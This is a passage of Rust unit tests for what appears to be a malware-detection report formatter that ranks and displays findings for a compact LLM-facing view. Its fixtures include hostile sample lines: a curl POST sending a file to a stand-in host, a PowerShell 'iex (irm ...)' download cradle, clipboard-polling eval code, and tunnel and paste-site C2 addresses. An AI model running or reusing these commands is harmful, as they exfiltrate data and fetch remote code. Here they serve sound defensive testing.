        findings.push(finding_with(&format!("base-{i}"), Criticality::Baseline));
    }
    let file = file_with_findings(findings);
    let selected = select_ids(&file, &TinyOpts::tiny(), 15);
    assert_eq!(selected.len(), 15, "fill tops up to the budget");
    for i in 0..5 {
        assert!(selected.contains(&format!("notable-{i}").as_str()));
    }
    // Baseline outranks Component (crit 2 vs 1), so at equal confidence the
    // 10 baselines win the fill slots.
    for i in 0..10 {
        assert!(selected.contains(&format!("base-{i}").as_str()));
    }

    // A file already at/over the budget with real signal takes no fill.
    let findings = (0..20)
        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
        .collect();
    let file = file_with_findings(findings);
    assert_eq!(select_ids(&file, &TinyOpts::tiny(), 15).len(), 20);
}

#[test]
fn undetected_file_renders_low_tier_in_tiny_but_not_terminal() {
    // A benign file with only low-tier traits: the LLM/tiny view must show
    // its top traits (an empty payload tells a downstream grader nothing),
    // while the human terminal view stays quiet as before.
    let comp = finding_with("micro/fs::readdir", Criticality::Component);
    let base = finding_with("meta/build::debuglink", Criticality::Baseline);
    let file = src_file(
        0,
        "/bin/fake",
        1,
        vec![comp, base],
        vec![
            ctx_line(
                1,
                "readdir(dirp);",
                Some(ctx_note("micro/fs::readdir", Criticality::Component, 1)),
            ),
            ctx_line(
                2,
                "debuglink(section);",
                Some(ctx_note("meta/build::debuglink", Criticality::Baseline, 2)),
            ),
        ],
    );
    let report = report_with_files(vec![file]);

    let tiny = format_context(&report, &TinyOpts::tiny());
    assert!(
        tiny.contains("readdir(dirp);"),
        "tiny view surfaces low-tier context, got: {tiny:?}"
    );
    assert!(
        tiny.contains("debuglink(section);"),
        "baseline context surfaces too, got: {tiny:?}"
    );

    let terminal = format_context(&report, &TinyOpts::terminal());
    assert!(
        terminal.is_empty(),
        "terminal view stays quiet for an undetected file, got: {terminal:?}"
    );
}

#[test]
fn tiny_caps_context_to_top_five_scoring_files() {
    // Six source files, descending score. The top five draw their source
    // context (the hit line's code shows); the sixth is past the cap, so its
    // notable finding still surfaces as a bare note but its code never does.
    let files: Vec<FileAnalysis> = (0..6)
        .map(|i| {
            let id = format!("cat/trait::n{i}");
            let note = ctx_note(&id, Criticality::Notable, 1);
            src_file(
                i,
                &format!("/f{i}.py"),
                100 - i, // strictly descending: f0 highest, f5 lowest
                vec![Finding {
                    desc: format!("finding desc {i}").into(),
                    ..finding_with(&id, Criticality::Notable)
                }],
                vec![ctx_line(
                    1,
                    &format!("CODELINE_{i} = real_work()"),
                    Some(note),
                )],
            )
        })
        .collect();
    let output = format_tiny(&report_with_files(files));

    // Top five render their code...
    for i in 0..5 {
        assert!(
            output.contains(&format!("CODELINE_{i}")),
            "file {i} (top-5) should show context\n{output}"
        );
    }
    // ...the sixth does not, but its finding is not lost — it shows as a note.
    assert!(
        !output.contains("CODELINE_5"),
        "file 5 is past the context cap; no window\n{output}"
    );
    assert!(
        output.contains("finding desc 5"),
        "file 5's finding still surfaces as a bare note\n{output}"
    );
}

/// Capture keeps only the strongest note on an overlapping span, so a
/// hostile composite anchored on its leg's evidence displaces the leg's own
/// note. The tiny view then withholds the composite — and with it the only
/// located evidence: the leg rendered as a bare note and the matched line
/// never appeared. The composite's note now stands in for the omitted leg.
#[test]
fn tiny_hands_a_withheld_composite_note_to_its_leg() {
    let leg = "micro/http/upload::curl-post-file";
    let mut composite = finding_with("objectives/exfil::skill-posts-file", Criticality::Hostile);
    composite.trait_refs = vec![leg.to_string().into()];
    let leg_finding = Finding {
        evidence: vec![Evidence::new("string", "", "curl").with_offset(12 * LINE_BYTES)],
        ..finding_with(leg, Criticality::Notable)
    };
    let file = src_file(
        0,
        "SKILL.md",
        50,
        vec![leg_finding, composite],
        vec![ctx_line(
            12,
            "curl -X POST https://h.example/a --data-binary @a\n",
            Some(ctx_note(
                "objectives/exfil::skill-posts-file",
                Criticality::Hostile,
                12,
            )),
        )],
    );
    let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
    assert!(
        tiny.contains("--data-binary @a"),
        "the leg's matched line must render: {tiny}"
    );
    assert!(
        tiny.contains("# N 12:1 micro/http/upload::curl-post-file"),
        "the window is annotated with the leg, not the composite: {tiny}"
    );
    assert!(
        !tiny.contains("skill-posts-file"),
        "the composite stays withheld: {tiny}"
    );
}

/// The opt-in roster names a composite the tiny preset withholds.
#[test]
fn elevated_roster_lists_a_withheld_composite_when_enabled() {
    let leg = "micro/http/upload::curl-post-file";
    let comp = "objectives/exfil::skill-posts-file";
    let composite = Finding {
        trait_refs: vec![leg.to_string().into()],
        ..finding_with(comp, Criticality::Hostile)
    };
    let leg_finding = Finding {
        evidence: vec![Evidence::new("string", "", "curl").with_offset(12 * LINE_BYTES)],
        ..finding_with(leg, Criticality::Notable)
    };
    let file = src_file(
        0,
        "SKILL.md",
        50,
        vec![leg_finding, composite],
        vec![ctx_line(
            12,
            "curl -X POST https://h.example/a --data-binary @a\n",
            Some(ctx_note(leg, Criticality::Notable, 12)),
        )],
    );
    let report = report_with_files(vec![file]);
    assert!(!format_tiny(&report).contains(comp), "off by default");
    let opts = TinyOpts {
        elevated_roster: true,
        ..TinyOpts::tiny()
    };
    let tiny = format_context(&report, &opts);
    assert!(
        tiny.contains(&format!("# H {comp}")),
        "the hostile composite must be listed: {tiny}"
    );
    assert!(
        tiny.contains(&format!("# N 12:1 {leg}")),
        "its leg still annotates the evidence line: {tiny}"
    );
}

/// Two elevated findings on one source line each get their annotation;
/// keeping only the strongest note per row hid the other.
#[test]
fn tiny_announces_every_elevated_note_on_a_shared_line() {
    let a = "objectives/exec::decode-exec";
    let b = "objectives/evasion::debugger-abort";
    let mut line = ctx_line(1, "exec(d(p)) if not trace() else exit()\n", None);
    line.notes = vec![
        ctx_note(a, Criticality::Hostile, line.line.loc),
        ctx_note(b, Criticality::Suspicious, line.line.loc + 18), // `trace`
    ];
    let file = src_file(
        0,
        "x.py",
        50,
        vec![
            finding_with(a, Criticality::Hostile),
            finding_with(b, Criticality::Suspicious),
        ],
        vec![line],
    );
    let tiny = format_tiny(&report_with_files(vec![file]));
    assert!(tiny.contains(&format!("# H 1:1 {a}")), "{tiny}");
    assert!(tiny.contains(&format!("# S 1:19 {b}")), "{tiny}");
    assert_eq!(
        tiny.matches(&format!("({b})")).count(),
        1,
        "shown once, not rostered again: {tiny}"
    );
}

/// A hostile composite over component legs that share a line with a
/// stronger note: both legs are announced on that line, and nothing names
/// the composite.
#[test]
fn tiny_shows_component_legs_of_a_withheld_composite() {
    let strong = "micro/exec::eval-call";
    let (a, b) = ("micro/io::read-clipboard", "micro/time::set-interval");
    let comp = "objectives/steal::clipboard-poll-exfil";
    let composite = Finding {
        trait_refs: vec![a.to_string().into(), b.to_string().into()],
        ..finding_with(comp, Criticality::Hostile)
    };
    let mut line = ctx_line(
        3,
        "setInterval(()=>eval(navigator.clipboard.readText()))\n",
        None,
    );
    line.notes = vec![
        ctx_note(strong, Criticality::Notable, line.line.loc + 16), // `eval`
        ctx_note(a, Criticality::Component, line.line.loc + 41),    // `readText`
        ctx_note(b, Criticality::Component, line.line.loc),
    ];
    let file = src_file(
        0,
        "bg.js",
        50,
        vec![
            finding_with(strong, Criticality::Notable),
            finding_with(a, Criticality::Component),
            finding_with(b, Criticality::Component),
            composite,
        ],
        vec![line],
    );
    let tiny = format_tiny(&report_with_files(vec![file]));
    assert!(tiny.contains(&format!("# N 3:17 {strong}")), "{tiny}");
    assert!(tiny.contains(&format!("# C 3:42 {a}")), "{tiny}");
    assert!(tiny.contains(&format!("# C 3:1 {b}")), "{tiny}");
    assert!(!tiny.contains(comp) && !tiny.contains("# H"), "{tiny}");
}

/// Legs resolve through a nested composite to its atoms; neither
/// composite's id reaches the render.
#[test]
fn tiny_resolves_nested_composites_to_their_atoms() {
    let top = "objectives/exfil::wallet-exfil";
    let mid = "micro/ui::credential-surface";
    let (label, post) = ("micro/ui::mnemonic-label", "micro/http::post");
    let file = src_file(
        0,
        "x.js",
        50,
        vec![
            Finding {
                trait_refs: vec![mid.to_string().into(), post.to_string().into()],
                ..finding_with(top, Criticality::Hostile)
            },
            Finding {
                trait_refs: vec![label.to_string().into()],
                ..finding_with(mid, Criticality::Notable)
            },
            finding_with(label, Criticality::Component),
            finding_with(post, Criticality::Baseline),
        ],
        vec![],
    );
    let tiny = format_tiny(&report_with_files(vec![file]));
    assert!(tiny.contains(&format!("({label})")), "{tiny}");
    assert!(tiny.contains(&format!("({post})")), "{tiny}");
    assert!(!tiny.contains(top) && !tiny.contains(mid), "{tiny}");
}

/// An archive-scope composite pools legs from two members: each leg
/// renders in the member it matched in, not on the container.
#[test]
fn tiny_places_cross_member_legs_in_their_members() {
    let comp = "objectives/exfil::form-to-http";
    let (form, send) = ("micro/ui::form-input", "micro/http::fetch-post");
    let mut root = src_file(
        0,
        "/s/ext.zip",
        90,
        vec![
            Finding {
                trait_refs: vec![form.to_string().into(), send.to_string().into()],
                ..finding_with(comp, Criticality::Hostile)
            },
            // The container's inherited copies of its members' legs.
            Finding {
                src: Some(1),
                ..finding_with(form, Criticality::Component)
            },
            Finding {
                src: Some(2),
                ..finding_with(send, Criticality::Component)
            },
        ],
        vec![],
    );
    root.file_type = "zip".to_string();
    root.composite_sources.insert(
        comp.to_string(),
        vec![
            crate::types::file_analysis::CompositeSource {
                file: 1,
                line: None,
                offset: None,
            },
            crate::types::file_analysis::CompositeSource {
                file: 2,
                line: None,
                offset: None,
            },
        ],
    );
    let member = |id: u32, name: &str, leg: &str| {
        let mut m = src_file(
            id,
            &format!("/s/ext.zip!!{name}"),
            10,
            vec![finding_with(leg, Criticality::Component)],
            vec![],
        );
        m.depth = 1;
        m.parent_id = Some(0);
        m
    };
    let files = vec![root, member(1, "login.js", form), member(2, "app.js", send)];
    let tiny = format_tiny(&report_with_files(files));
    // A member's block: from its header to the next file header.
    let block = |name: &str| {
        let rest = tiny
            .find(&format!("ext.zip/{name}\t"))
            .map_or("", |start| &tiny[start..]);
        let end = rest
            .get(1..)
            .and_then(|r| r.find("ext.zip/"))
            .map_or(rest.len(), |i| i + 1);
        rest[..end].to_string()
    };
    assert!(block("login.js").contains(&format!("({form})")), "{tiny}");
    assert!(block("app.js").contains(&format!("({send})")), "{tiny}");
    assert!(!tiny.contains(comp), "{tiny}");
}

#[test]
fn mentions_id_matches_whole_ids_only() {
    assert!(mentions_id("desc (a/b::c)\n", "a/b::c"));
    assert!(mentions_id("# S a/b::c\n", "a/b::c"));
    assert!(!mentions_id("desc (a/b::c-d)", "a/b::c"));
    assert!(!mentions_id("desc (x/a/b::c)", "a/b::c"));
}

/// A composite's note covers the one leg it was anchored on. Its other
/// legs match elsewhere, so handing them the note would label a line with
/// a trait that is not its evidence (a paste-site leg once annotated a
/// tunnel URL line); they stay location-less instead.
#[test]
fn tiny_relabel_hands_a_composite_note_only_to_legs_it_covers() {
    let a = "micro/tunnel::quick-service";
    let b = "micro/paste::shz-al";
    let comp = "objectives/c2::tunnel-address-paste-rendezvous";
    let leg = |id: &str, off: u64, value: &str| Finding {
        evidence: vec![Evidence::new("string", "", value).with_offset(off)],
        ..finding_with(id, Criticality::Notable)
    };
    let composite = Finding {
        trait_refs: vec![a.to_string().into(), b.to_string().into()],
        ..finding_with(comp, Criticality::Suspicious)
    };
    let file = src_file(
        0,
        "agent.py",
        50,
        vec![
            leg(a, 12 * LINE_BYTES, "trycloudflare"),
            leg(b, 900, "shz.al"),
            composite,
        ],
        vec![ctx_line(
            12,
            "QUICK_SERVICE = 'https://api.trycloudflare.com'\n",
            Some(ctx_note(comp, Criticality::Suspicious, 12)),
        )],
    );
    let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
    assert!(
        tiny.contains(&format!("# N 12:1 {a}")),
        "the covered leg takes the note: {tiny}"
    );
    assert!(
        !tiny.contains(&format!("12:1 {b}")),
        "the uncovered leg is not labeled onto the anchor line: {tiny}"
    );
    assert!(tiny.contains(b), "the uncovered leg still lists: {tiny}");
    assert!(
        !tiny.contains("rendezvous"),
        "the composite stays withheld: {tiny}"
    );
}

/// Each leg of a withheld composite labels the line at its own column:
/// notes come from the final findings, so a leg with its own span is never
/// left unnamed under the composite's note.
#[test]
fn tiny_labels_each_leg_of_a_withheld_composite_at_its_own_column() {
    let a = "micro/ps::iex";
    let b = "micro/ps::irm-alias";
    let comp = "objectives/exec::download-cradle";
    let leg = |id: &str, off: u64, value: &str| Finding {
        evidence: vec![Evidence::new("string", "", value).with_offset(off)],
        ..finding_with(id, Criticality::Notable)
    };
    let composite = Finding {
        trait_refs: vec![a.to_string().into(), b.to_string().into()],
        ..finding_with(comp, Criticality::Suspicious)
    };
    // One drawn line holds both legs; the composite's note covers only A.
    let file = src_file(
        0,
        "sample.ps1",
        50,
        vec![leg(a, 0, "iex"), leg(b, 5, "irm"), composite],
        vec![ctx_line(
            0,
            "iex (irm https://h.example/p)\n",
            Some(ctx_note(comp, Criticality::Suspicious, 0)),
        )],
    );
    let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
    assert!(
        tiny.contains("irm https://h.example/p"),
        "line drawn: {tiny}"
    );
    assert!(
        tiny.contains(&format!("0:1 {a}")),
        "A labels the line: {tiny}"
    );
    assert!(
        tiny.contains(&format!("0:6 {b}")),
        "B labels its own column: {tiny}"
    );
    assert!(!tiny.contains(comp), "{tiny}");
}

/// A window the per-file cap declines to draw must not take its finding
/// with it: the finding lists as a location-less note instead.
#[test]
fn tiny_window_cap_keeps_capped_findings_as_notes() {
    let ctx = |i: u64, id: &str| {
        ctx_line(
            i * 100,
            "payload_line_with_enough_code(x)\n",
            Some(ctx_note(id, Criticality::Notable, i * 100)),
        )
    };
    let mut file = src_file(
        0,
        "a.py",
        50,
        vec![
            finding_with("t/one", Criticality::Notable),
            finding_with("t/two", Criticality::Notable),
            finding_with("t/three", Criticality::Notable),
        ],
        vec![ctx(1, "t/one"), ctx(2, "t/two"), ctx(3, "t/three")],
    );
    for (f, c) in file.findings.iter_mut().zip([0.9, 0.8, 0.7]) {
        f.conf = c;
    }
    let opts = TinyOpts {
        max_windows: 1,
        ..TinyOpts::tiny()
    };
    let tiny = format_context(&report_with_files(vec![file]), &opts);
    assert_eq!(
        tiny.matches("payload_line_with_enough_code").count(),
        1,
        "one window drawn: {tiny}"
    );
    for id in ["t/one", "t/two", "t/three"] {
        assert!(tiny.contains(id), "{id} must still be listed: {tiny}");
    }
}

/// The byte budget keeps the strongest windows that fit and lists the rest
/// as notes; a weaker window that still fits is not skipped.
#[test]
fn tiny_window_byte_budget_keeps_strongest_that_fit() {
    let big = "x".repeat(300);
    let mk = |i: u64, id: &str, data: &str, conf: f32| {
        let mut l = ctx_line(
            i * 1000,
            data,
            Some(ctx_note(id, Criticality::Notable, i * 1000)),
        );
        l.notes[0].conf = conf;
        l
    };
    let mut file = src_file(
        0,
        "a.py",
        50,
        vec![
            finding_with("t/strong", Criticality::Notable),
            finding_with("t/mid", Criticality::Notable),
            finding_with("t/weak", Criticality::Notable),
        ],
        vec![
            mk(1, "t/strong", &format!("strong_call({big})\n"), 0.9),
            mk(2, "t/mid", &format!("mid_call({big})\n"), 0.8),
            mk(3, "t/weak", "weak_call(short_enough)\n", 0.7),
        ],
    );
    for (f, c) in file.findings.iter_mut().zip([0.9, 0.8, 0.7]) {
        f.conf = c;
    }
    let opts = TinyOpts {
        window_bytes: 400,
        ..TinyOpts::tiny()
    };
    let tiny = format_context(&report_with_files(vec![file]), &opts);
    assert!(
        tiny.contains("strong_call("),
        "strongest window drawn: {tiny}"
    );
    assert!(
        !tiny.contains("mid_call("),
        "second 300-byte window overspends: {tiny}"
    );
    assert!(
        tiny.contains("weak_call("),
        "a weaker window that fits is drawn: {tiny}"
    );
    assert!(
        tiny.contains("t/mid"),
        "the budgeted-out finding is still listed: {tiny}"
    );
}

/// A located note for `id` at line `line` with confidence `conf`.
fn story_line(line: u64, data: &str, id: &str, crit: Criticality, conf: f32) -> Win {
    let mut note = ctx_note(id, crit, line);
    note.conf = conf;
    ctx_line(line, data, Some(note))
}

/// Findings for every note in `context`, at the note's criticality and
/// confidence, followed by `extra`.
fn story_file(context: Vec<Win>, extra: Vec<Finding>) -> FileAnalysis {
    let mut findings: Vec<Finding> = context
        .iter()
        .flat_map(|l| &l.notes)
        .map(|n| Finding {
            conf: n.conf,
            ..finding_with(n.id.as_str(), n.crit)
        })
        .collect();
    findings.extend(extra);
    src_file(0, "agent.py", 50, findings, context)
}

fn capped(max_windows: usize) -> TinyOpts {
    TinyOpts {
        max_windows,
        ..TinyOpts::tiny()
    }
}

/// Criticality wins: one suspicious window beats notable windows however
/// confident, compact or diverse they are.
#[test]
fn tiny_window_pick_prefers_criticality_over_everything_else() {
    let mut context = vec![story_line(
        900,
        &format!("suspicious_call({})\n", "x".repeat(200)),
        "objectives/evasion/history::off",
        Criticality::Suspicious,
        0.5,
    )];
    for (i, fam) in ["net/http", "fs/write", "process/create", "crypto/aes"]
        .iter()
        .enumerate()
    {
        context.push(story_line(
            i as u64 + 1,
            &format!("notable_{i}()\n"),
            &format!("micro-behaviors/{fam}::n{i}"),
            Criticality::Notable,
            0.95,
        ));
    }
    context.sort_by_key(|w| w.line.loc);
    let tiny = format_context(
        &report_with_files(vec![story_file(context, vec![])]),
        &capped(1),
    );
    assert!(
        tiny.contains("suspicious_call("),
        "suspicious drawn: {tiny}"
    );
    assert!(!tiny.contains("notable_0()"), "no notable window: {tiny}");
}

/// Within one criticality, a window from a family not yet drawn beats a
/// slightly more confident one repeating a family already shown.
#[test]
fn tiny_window_pick_spreads_across_families() {
    let context = vec![
        story_line(
            1,
            "first_http(a)\n",
            "micro-behaviors/net/http::a",
            Criticality::Notable,
            0.9,
        ),
        story_line(
            2,
            "again_http(b)\n",
            "micro-behaviors/net/http::b",
            Criticality::Notable,
            0.85,
        ),
        story_line(
            3,
            "write_file(c)\n",
            "micro-behaviors/fs/write::c",
            Criticality::Notable,
            0.8,
        ),
    ];
    let tiny = format_context(
        &report_with_files(vec![story_file(context, vec![])]),
        &capped(2),
    );
    assert!(tiny.contains("first_http(a)"), "best window drawn: {tiny}");
    assert!(tiny.contains("write_file(c)"), "new family drawn: {tiny}");
    assert!(
        !tiny.contains("again_http(b)"),
        "repeat family skipped: {tiny}"
    );
    assert!(
        tiny.contains("micro-behaviors/net/http::b"),
        "the skipped finding still lists: {tiny}"
    );
}

/// A withheld composite's leg outranks an equally graded, more confident
/// unreferenced note — whether the leg holds its own note or was handed
/// the composite's — yet its window carries only the leg's own label.
#[test]
fn tiny_window_pick_ranks_legs_by_their_withheld_composite() {
    let leg = "objectives/command-and-control/infrastructure/paste::shz-al";
    let comp = "objectives/command-and-control/channel/rendezvous::paste";
    for relabeled in [false, true] {
        let composite = Finding {
            trait_refs: vec![leg.to_string().into()],
            conf: 0.8,
            ..finding_with(comp, Criticality::Suspicious)
        };
        let leg_finding = Finding {
            conf: 0.7,
            evidence: vec![Evidence::new("string", "", "shz.al").with_offset(50 * LINE_BYTES)],
            ..finding_with(leg, Criticality::Notable)
        };
        let leg_line = if relabeled {
            story_line(
                50,
                "PASTE = 'https://shz.al/x'\n",
                comp,
                Criticality::Suspicious,
                0.8,
            )
        } else {
            story_line(
                50,
                "PASTE = 'https://shz.al/x'\n",
                leg,
                Criticality::Notable,
                0.7,
            )
        };
        let other = story_line(
            1,
            "requests.get(url)\n",
            "micro-behaviors/net/http::get",
            Criticality::Notable,
            0.95,
        );
        let mut file = story_file(vec![other], vec![leg_finding, composite]);
        annotate(&mut file, vec![leg_line]);
        let tiny = format_context(&report_with_files(vec![file]), &capped(1));
        assert!(
            tiny.contains("shz.al"),
            "relabeled={relabeled}: leg drawn: {tiny}"
        );
        assert!(
            !tiny.contains("requests.get(url)"),
            "relabeled={relabeled}: unreferenced note not drawn: {tiny}"
        );
        assert!(
            tiny.contains(&format!("# N 50:1 {leg}")),
            "relabeled={relabeled}: the leg's own grade and id: {tiny}"
        );
        assert!(
            !tiny.contains("rendezvous") && !tiny.contains("# S ") && !tiny.contains("# H "),
            "relabeled={relabeled}: no composite id or grade leaks: {tiny}"
        );
    }
}

/// An import note no composite draws on earns no window on a budgeted
/// file, however confident, and still lists as a location-less note.
#[test]
fn tiny_window_pick_skips_metadata_only_windows() {
    let import = "metadata/import/python/subprocess::subprocess";
    let context = vec![
        story_line(1, "import subprocess\n", import, Criticality::Notable, 0.95),
        story_line(
            10,
            "requests.get(url)\n",
            "micro-behaviors/net/http::get",
            Criticality::Notable,
            0.5,
        ),
        story_line(
            20,
            "open(p, 'w')\n",
            "micro-behaviors/fs/write::open",
            Criticality::Notable,
            0.5,
        ),
    ];
    let tiny = format_context(
        &report_with_files(vec![story_file(context, vec![])]),
        &capped(2),
    );
    assert!(
        !tiny.contains("import subprocess"),
        "import not drawn: {tiny}"
    );
    assert!(tiny.contains("requests.get(url)"), "behavior drawn: {tiny}");
    assert!(tiny.contains("open(p, 'w')"), "behavior drawn: {tiny}");
    assert!(tiny.contains(import), "import still lists: {tiny}");
}

/// Equal candidates across families and tiers render identically run to
/// run, whatever order the hash maps iterate in.
#[test]
fn tiny_window_pick_is_deterministic() {
    let context: Vec<Win> = (0..40u64)
        .map(|i| {
            story_line(
                i * 10 + 1,
                &format!("call_{i}(arg)\n"),
                &format!("micro-behaviors/f{}/g{}::t{i}", i % 5, i % 3),
                Criticality::Notable,
                0.8,
            )
        })
        .collect();
    let report = report_with_files(vec![story_file(context, vec![])]);
    let first = format_context(&report, &capped(7));
    for _ in 0..20 {
        assert_eq!(format_context(&report, &capped(7)), first);
    }
}

/// Composite backing propagates through nested composites: an atom two
/// composites deep takes the outer composite's criticality, and each
/// composite counts once.
#[test]
fn withheld_composite_support_propagates_through_nested_composites() {
    let outer = Finding {
        trait_refs: vec!["objectives/inner".to_string().into()],
        ..finding_with("objectives/outer", Criticality::Hostile)
    };
    let inner = Finding {
        trait_refs: vec!["micro/atom".to_string().into()],
        ..finding_with("objectives/inner", Criticality::Suspicious)
    };
    let file = src_file(
        0,
        "a.py",
        50,
        vec![
            outer,
            inner,
            finding_with("micro/atom", Criticality::Notable),
        ],
        vec![],
    );
    let got = withheld_composite_support(&file, &HashSet::new());
    let hostile = Criticality::Hostile.rank();
    assert_eq!(
        got.get("micro/atom"),
        Some(&CompositeSupport {
            rank: hostile,
            composites: 2
        })
    );
    assert_eq!(
        got.get("objectives/inner"),
        Some(&CompositeSupport {
            rank: hostile,
            composites: 1
        })
    );
    assert_eq!(got.get("objectives/outer"), None);
}

#[test]
fn trait_family_takes_segments_below_the_namespace() {
    let id = "objectives/command-and-control/infrastructure/paste::shz-al";
    assert_eq!(
        trait_family(id, 2),
        "objectives/command-and-control/infrastructure"
    );
    assert_eq!(
        trait_family(id, 3),
        "objectives/command-and-control/infrastructure/paste"
    );
    assert_eq!(trait_family("t/one", 3), "t/one");
}

#[test]
fn tiny_unmatched_component_shows_single_line() {
    // A component trait no composite drew on shows only its own line — no
    // before/after context — even though neighbors carry real code.
    let notable = ctx_note("cat/n::hit", Criticality::Notable, 1);
    let comp = ctx_note("blocks/c::lone", Criticality::Component, 10);
    let file = src_file(
        0,
        "/only.py",
        50,
        vec![
            Finding {
                desc: "real finding".to_string().into(),
                ..finding_with("cat/n::hit", Criticality::Notable)
            },
            finding_with("blocks/c::lone", Criticality::Component),
        ],
        vec![
            ctx_line(1, "anchor = notable_here()", Some(notable)),
            ctx_line(9, "NEIGHBOR_BEFORE = setup()", None),
            ctx_line(10, "COMPONENTLINE = import_os()", Some(comp)),
            ctx_line(11, "NEIGHBOR_AFTER = teardown()", None),
        ],
    );
    let output = format_tiny(&report_with_files(vec![file]));
    assert!(
        output.contains("COMPONENTLINE"),
        "the component's own line shows\n{output}"
    );
    assert!(
        !output.contains("NEIGHBOR_BEFORE") && !output.contains("NEIGHBOR_AFTER"),
        "an unmatched component gets no surrounding context\n{output}"
    );
}

// Window sizing by inherited composite severity — a leg rendered with its
// stronger composite's radius — is decided at capture time now, and covered by
// `context::tests::{textual,binary}_atomic_leg_reserves_stronger_composites_window`.
// The render layer emits every row of the captured chunk, so the former
// per-line radius tests here have no rendering decision left to exercise.

#[test]
fn tiny_binary_lists_all_descriptions_ahead_of_merged_block() {
    // The binary (ASCII-forward) interpret view's model: a single merged byte
    // window carrying multiple traits lists *all* their descriptions ahead of
    // the block ("here's what we detected in these bytes"), then the byte
    // rows.
    //
    // Within a block they lead with the worst thing in it, and each line
    // carries the hex offset that locates it in the rows below.
    let data: Vec<u8> = (0u8..80).collect(); // bytes 0x41.. render as ABC… in-block
    let file = bin_file(
        0,
        90,
        vec![
            finding_with("net/connect", Criticality::Notable),
            finding_with("exec/shell", Criticality::Suspicious),
        ],
        vec![byte_unit(
            0,
            &data,
            vec![
                ctx_note("net/connect", Criticality::Notable, 20),
                ctx_note("exec/shell", Criticality::Suspicious, 40),
            ],
        )],
    );
    let output = format_tiny(&report_with_files(vec![file]));

    let s_desc = output
        .find("exec/shell desc")
        .expect("suspicious desc shown");
    let n_desc = output.find("net/connect desc").expect("notable desc shown");
    let block = output.find("ABCDEFG").expect("byte block rendered");
    // Strongest description leads, and both precede the byte block.
    assert!(s_desc < n_desc, "strongest description first:\n{output}");
    assert!(
        n_desc < block,
        "every description precedes the block's bytes:\n{output}"
    );
    // Each carries the hex offset of its match — 20 and 40 decimal.
    assert!(
        output.contains("14 net/connect desc") && output.contains("28 exec/shell desc"),
        "each description carries its hex match offset:\n{output}"
    );
}

/// One captured window splits into a block per contiguous run its own
/// annotations cover.
///
/// Capture merges overlapping windows, and low-tier traits this view does
/// not list bridge them: on `/bin/ls` sixteen listed detections arrived as
/// one 1.5 KB window, so the block held hundreds of bytes no annotation
/// accounted for and the reader had nothing tying either lump to the other.
/// A gap between detections must end the block.
#[test]
fn tiny_binary_splits_a_merged_window_into_contiguous_blocks() {
    // 1 KB window with detections at each end and nothing between: the
    // notable margin is ±64/128 bytes, far short of the 700-byte gap.
    let mut data = vec![b'.'; 1024];
    data[100..108].copy_from_slice(b"NEAR_LOW");
    data[900..909].copy_from_slice(b"NEAR_HIGH");
    let file = bin_file(
        0,
        2048,
        vec![
            finding_with("low/hit", Criticality::Notable),
            finding_with("high/hit", Criticality::Notable),
        ],
        vec![byte_unit(
            0,
            &data,
            vec![
                ctx_note("low/hit", Criticality::Notable, 100),
                ctx_note("high/hit", Criticality::Notable, 900),
            ],
        )],
    );
    let out = format_tiny(&report_with_files(vec![file]));

    // Two blocks, each carrying only its own annotation.
    let low_desc = out.find("low/hit desc").expect("low annotation");
    let low_bytes = out.find("NEAR_LOW").expect("low bytes");
    let high_desc = out.find("high/hit desc").expect("high annotation");
    let high_bytes = out.find("NEAR_HIGH").expect("high bytes");
    assert!(
        low_desc < low_bytes && low_bytes < high_desc && high_desc < high_bytes,
        "each block must follow its own annotations:\n{out}",
    );

    // The dead span between them is not rendered: every row belongs to one
    // of the two blocks.
    let rows: Vec<u64> = out
        .lines()
        .filter_map(|l| {
            let (gutter, rest) = l.split_once(['-', ':'])?;
            rest.starts_with(' ')
                .then(|| u64::from_str_radix(gutter, 16).ok())
                .flatten()
        })
        .collect();
    assert!(!rows.is_empty(), "no rows rendered:\n{out}");
    assert!(
        rows.iter().all(|off| *off < 300 || *off > 700),
        "the unannotated span between blocks must not be rendered: {rows:?}\n{out}",
    );
}

/// A source chunk renders as blocks of *consecutive* lines, separated by a
/// blank line and with no blank line of their own at either edge.
///
/// The renderer drops rows carrying no match and no real code, so the lines
/// it emits from one chunk are routinely not consecutive in the file. Run
/// together they read as one block of code that never existed; padded with
/// the source's own blank lines they read as a bigger jump than there is.
#[test]
fn tiny_source_blocks_are_separated_and_edge_trimmed() {
    use crate::types::{ContextLine, Note};

    // Matches on the first and last statements, blank source lines flanking
    // the second, and filler between that carries neither a match nor real
    // code.
    let src =
        "const alpha = requireSomething();\n}\n}\n}\n\nconst beta = exfiltrateSomething();\n\n}\n";
    let note = |id: &str, off: u64| Note {
        crit: Criticality::Notable,
        id: id.to_string().into(),
        desc: format!("{id} desc").into(),
        off,
        len: 5,
        conf: 0.9,
    };
    let beta_off = src.find("const beta").unwrap_or(0) as u64;
    let file = src_file(
        0,
        "/t/sample.js",
        90,
        vec![
            finding_with("a/first", Criticality::Notable),
            finding_with("b/second", Criticality::Notable),
        ],
        vec![Win {
            line: ContextLine {
                loc: 0,
                line: Some(1),
                col: Some(1),
                data: src.as_bytes().to_vec(),
            },
            notes: vec![note("a/first", 0), note("b/second", beta_off)],
        }],
    );
    let out = format_tiny(&report_with_files(vec![file]));

    // Skip the header line; the rest is the rendered body, less the
    // document's own trailing newline.
    let mut body: Vec<&str> = out.lines().skip(1).collect();
    while body.last().is_some_and(|l| l.is_empty()) {
        body.pop();
    }
    assert!(
        body.iter().any(|l| l.contains("const alpha"))
            && body.iter().any(|l| l.contains("const beta")),
        "both matched lines render: {out:?}",
    );
    assert!(
        !body.iter().any(|l| l.trim().is_empty() && !l.is_empty()),
        "a whitespace-only row is padding, not content: {out:?}",
    );
    let blanks: Vec<usize> = body
        .iter()
        .enumerate()
        .filter(|(_, l)| l.is_empty())
        .map(|(i, _)| i)
        .collect();
    assert!(
        blanks.windows(2).all(|w| w[1] != w[0] + 1),
        "blocks are separated by exactly one blank line: {out:?}",
    );
    assert!(
        body.first().is_some_and(|l| !l.is_empty()) && body.last().is_some_and(|l| !l.is_empty()),
        "the body must not open or close on a blank line: {out:?}",
    );
}

#[test]
fn tiny_binary_separates_independent_blocks() {
    // Two non-overlapping byte windows render as separate blocks, each with its
    // own detection listed ahead of it, in file order.
    let file = bin_file(
        0,
        90,
        vec![
            finding_with("first/hit", Criticality::Suspicious),
            finding_with("second/hit", Criticality::Hostile),
        ],
        vec![
